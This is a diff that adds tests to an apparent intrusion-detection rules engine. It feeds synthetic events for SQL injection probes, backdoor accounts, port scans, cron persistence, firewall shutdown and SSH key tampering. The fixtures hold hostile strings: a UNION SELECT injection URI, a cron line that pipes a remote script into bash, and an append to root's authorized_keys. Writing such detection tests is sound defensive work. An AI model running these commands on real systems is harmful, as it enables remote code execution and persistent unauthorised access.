@@ -407,3 +407,115 @@ def test_out_of_order_events_handled_correctly(engine):
     assert len(alerts) == 1
     assert alerts[0]["rule_id"] == "RULE-AUTH-003"
 
+
+# =====================================================================
+# 5. MULTI-SOURCE DETECTION RULES (WEB, ACCOUNT, FIREWALL, CRON, TAMPER)
+# =====================================================================
+
+def test_web_attack_probe_and_account_backdoor_rules(engine):
+    events = [
+        {
+            "id": "EVT-WEB-1",
+            "host_id": "host-fenn",
+            "source_id": "nginx-access",
+            "event_type": "web_attack_probe",
+            "event_timestamp": "2026-11-07T11:00:00Z",
+            "source_ip": "198.51.100.88",
+            "user_name": None,
+            "details": {
+                "attack_category": "sql_injection",
+                "uri": "/login?user=admin%27%20UNION%20SELECT%201--",
+                "status_code": 500,
+            },
+        },
+        {
+            "id": "EVT-ACCT-1",
+            "host_id": "host-fenn",
+            "source_id": "ssh-auth",
+            "event_type": "account_created",
+            "event_timestamp": "2026-11-07T11:01:00Z",
+            "source_ip": None,
+            "user_name": "sysbackup",
+            "details": {"uid": "0", "gid": "0"},
+        },
+    ]
+    alerts, evidence = engine.evaluate_events(events)
+    rule_ids = {a["rule_id"]: a for a in alerts}
+    assert "RULE-WEB-ATTACK" in rule_ids
+    assert rule_ids["RULE-WEB-ATTACK"]["severity"] == "critical"
+    assert "RULE-ACCT-BACKDOOR" in rule_ids
+    assert rule_ids["RULE-ACCT-BACKDOOR"]["severity"] == "critical"
+
+
+def test_firewall_portscan_and_kernel_segfault_rules(engine):
+    base_time = datetime(2026, 11, 7, 11, 10, 0, tzinfo=timezone.utc)
+    events = [
+        {
+            "id": f"EVT-UFW-{i}",
+            "host_id": "host-fenn",
+            "source_id": "systemd",
+            "event_type": "firewall_block",
+            "event_timestamp": (base_time + timedelta(seconds=i * 5)).isoformat(),
+            "source_ip": "203.0.113.55",
+            "user_name": None,
+            "details": {"dest_port": 3300 + i, "protocol": "TCP"},
+        }
+        for i in range(4)
+    ] + [
+        {
+            "id": "EVT-KRN-1",
+            "host_id": "host-fenn",
+            "source_id": "systemd",
+            "event_type": "kernel_segfault",
+            "event_timestamp": (base_time + timedelta(seconds=30)).isoformat(),
+            "source_ip": None,
+            "user_name": None,
+            "details": {"process_name": "apache2", "library": "libc.so.6"},
+        }
+    ]
+    alerts, _ = engine.evaluate_events(events)
+    rule_ids = {a["rule_id"] for a in alerts}
+    assert "RULE-FW-PORTSCAN" in rule_ids
+    assert "RULE-KERNEL-EXPLOIT" in rule_ids
+
+
+def test_cron_persistence_defense_evasion_and_key_tamper_rules(engine):
+    events = [
+        {
+            "id": "EVT-CRON-1",
+            "host_id": "host-fenn",
+            "source_id": "systemd",
+            "event_type": "cron_execution",
+            "event_timestamp": "2026-11-07T11:20:00Z",
+            "source_ip": None,
+            "user_name": "root",
+            "details": {"command": "curl -s http://198.51.100.99/p.sh | bash"},
+        },
+        {
+            "id": "EVT-SVC-1",
+            "host_id": "host-fenn",
+            "source_id": "systemd",
+            "event_type": "service_stopped",
+            "event_timestamp": "2026-11-07T11:21:00Z",
+            "source_ip": None,
+            "user_name": None,
+            "details": {"unit": "ufw.service"},
+        },
+        {
+            "id": "EVT-KEY-1",
+            "host_id": "host-fenn",
+            "source_id": "auditd",
+            "event_type": "critical_file_modified",
+            "event_timestamp": "2026-11-07T11:22:00Z",
+            "source_ip": None,
+            "user_name": "ubuntu",
+            "details": {"target_file": "/root/.ssh/authorized_keys", "command": "tee -a /root/.ssh/authorized_keys"},
+        },
+    ]
+    alerts, _ = engine.evaluate_events(events)
+    rule_ids = {a["rule_id"]: a["severity"] for a in alerts}
+    assert rule_ids.get("RULE-CRON-PERSIST") == "high"
+    assert rule_ids.get("RULE-DEFENSE-EVASION") == "critical"
+    assert rule_ids.get("RULE-SSH-KEY-BACKDOOR") == "critical"
+
+
